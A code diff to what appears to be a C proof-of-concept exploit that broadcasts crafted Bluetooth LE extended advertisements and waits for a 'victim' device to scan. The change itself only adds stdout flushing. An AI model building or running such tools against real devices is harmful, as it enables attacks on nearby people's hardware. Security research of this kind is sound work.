@@ -2,6 +2,7 @@
 #include <unistd.h>
 #include <sys/socket.h>
 #include <sys/uio.h>
+#include <stdio.h>
 #include <bluetooth/bluetooth.h>
 #include <bluetooth/l2cap.h>
 #include <bluetooth/hci.h>
@@ -69,10 +70,12 @@ int main(int argc, char **argv) {
   char buf[0x100];
 
   printf("[*] Resetting hci0 device...\n");
+  fflush(stdout);
   system("sudo hciconfig hci0 down");
   system("sudo hciconfig hci0 up");
 
   printf("[*] Opening hci device...\n");
+  fflush(stdout);
   struct hci_dev_info di;
   int hci_device_id = hci_get_route(NULL);
   int hci_socket = hci_open_dev(hci_device_id);
@@ -101,6 +104,7 @@ int main(int argc, char **argv) {
   rq.rlen = sizeof(status);
 
   printf("[*] Setting extended advertising parameters...\n");
+  fflush(stdout);
   hci_send_req(hci_socket, &rq, 1000);
 
   le_set_extended_advertising_data_cp *adv_data = (le_set_extended_advertising_data_cp *)buf;
@@ -120,6 +124,7 @@ int main(int argc, char **argv) {
   rq.rlen = sizeof(status);
 
   printf("[*] Setting extended advertising data...\n");
+  fflush(stdout);
   hci_send_req(hci_socket, &rq, 1000);
 
   le_set_extended_advertise_enable_cp *enable = (le_set_extended_advertise_enable_cp *)buf;
@@ -139,9 +144,11 @@ int main(int argc, char **argv) {
   rq.rlen = sizeof(status);
 
   printf("[*] Enabling extended advertising...\n");
+  fflush(stdout);
   hci_send_req(hci_socket, &rq, 1000);
 
   printf("[*] Waiting for victim to scan...\n");
+  fflush(stdout);
   sleep(60);
 
   hci_close_dev(hci_socket);
